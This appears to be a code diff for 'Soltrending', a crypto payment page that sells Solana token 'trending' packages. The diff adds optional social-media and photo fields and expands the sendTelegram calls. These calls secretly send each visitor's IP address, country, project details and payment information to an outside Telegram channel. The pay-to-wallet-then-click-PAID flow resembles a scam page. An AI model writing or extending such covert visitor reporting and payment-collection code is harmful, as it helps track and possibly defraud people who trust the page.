@@ -8,7 +8,7 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
-```
+
     body {
         font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -230,7 +230,7 @@
         .container { margin: 10px; padding: 20px; }
     }
 </style>
-```
+
 
 </head>
 <body>
@@ -238,7 +238,7 @@
         <div class="logo">Soltrending</div>
         <div class="user-info" id="userInfo">Loading location...</div>
 
-```
+
     <div class="step-dots">
         <div class="dot active" id="dot1"></div>
         <div class="dot" id="dot2"></div>
@@ -258,8 +258,21 @@
             <input type="text" id="caAddress" placeholder="Enter Solana contract address" required>
         </div>
         <div class="form-group">
-            <label>Contact Info *</label>
-            <input type="text" id="contactInfo" placeholder="@telegram or @twitter" required>
+            <label>Project Logo/Photo</label>
+            <input type="file" id="projectPhoto" accept="image/*">
+            <small style="color: #666;">Upload project logo or photo (optional)</small>
+        </div>
+        <div class="form-group">
+            <label>Telegram (optional)</label>
+            <input type="text" id="telegram" placeholder="@your_telegram">
+        </div>
+        <div class="form-group">
+            <label>X/Twitter (optional)</label>
+            <input type="text" id="twitter" placeholder="@your_twitter">
+        </div>
+        <div class="form-group">
+            <label>Website (optional)</label>
+            <input type="text" id="website" placeholder="https://yourwebsite.com">
         </div>
         <div class="form-group">
             <label>Project Description</label>
@@ -343,7 +356,7 @@
             <div class="alert alert-info">
                 <strong>Instructions:</strong><br>
                 1. Copy the wallet address above<br>
-                2. Send exactly <strong id="solAmount">0</strong> SOL<br>
+                2. Send the exact amount of SOL as requested<br>
                 3. Wait 1-2 minutes for confirmation<br>
                 4. Click "PAID" button
             </div>
@@ -411,14 +424,19 @@
         if (step === 1) {
             const name = document.getElementById('projectName').value.trim();
             const ca = document.getElementById('caAddress').value.trim();
-            const contact = document.getElementById('contactInfo').value.trim();
             
-            if (!name || !ca || !contact) {
+            if (!name || !ca) {
                 alert('Please fill all required fields');
                 return;
             }
 
-            sendTelegram(`📝 CA SUBMITTED\n👤 ${userCountry} (${userIP})\n🏷️ ${name}\n💰 ${ca}\n📞 ${contact}`);
+            const telegram = document.getElementById('telegram').value.trim();
+            const twitter = document.getElementById('twitter').value.trim();
+            const website = document.getElementById('website').value.trim();
+            const description = document.getElementById('projectDescription').value.trim();
+            const hasPhoto = document.getElementById('projectPhoto').files.length > 0;
+
+            sendTelegram(`📝 CA SUBMITTED\n👤 ${userCountry} (${userIP})\n🏷️ ${name}\n💰 ${ca}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}\n📸 Photo: ${hasPhoto ? 'Yes' : 'No'}`);
         }
         
         if (step === 2 && !selectedPackage) {
@@ -491,11 +509,10 @@
                 <h4>📋 Order Summary</h4>
                 Package: ${category.toUpperCase()} Trending<br>
                 Duration: ${duration.toUpperCase()}<br>
-                Amount: ${selectedPrice} SOL<br>
+                Amount: <strong>${selectedPrice} SOL</strong><br>
                 Project: ${document.getElementById('projectName').value}
             </div>
         `;
-        document.getElementById('solAmount').textContent = selectedPrice;
     }
 
     function copyWallet() {
@@ -530,7 +547,7 @@
                 </div>
             `;
 
-            sendTelegram(`🎉 PAYMENT SUCCESS!\n👤 ${userCountry} (${userIP})\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📞 ${document.getElementById('contactInfo').value}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n🔗 ${txId}\n✅ READY TO TREND!`);
+            sendTelegram(`🎉 PAYMENT SUCCESS!\n👤 ${userCountry} (${userIP})\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n🔗 ${txId}\n✅ READY TO TREND!`);
         } else {
             statusDiv.innerHTML = '<div class="alert alert-error">❌ No Payment Detected</div>';
             resultDiv.innerHTML = `
@@ -564,7 +581,7 @@
         location.reload();
     }
 </script>
-```
+
 
 </body>
 </html>
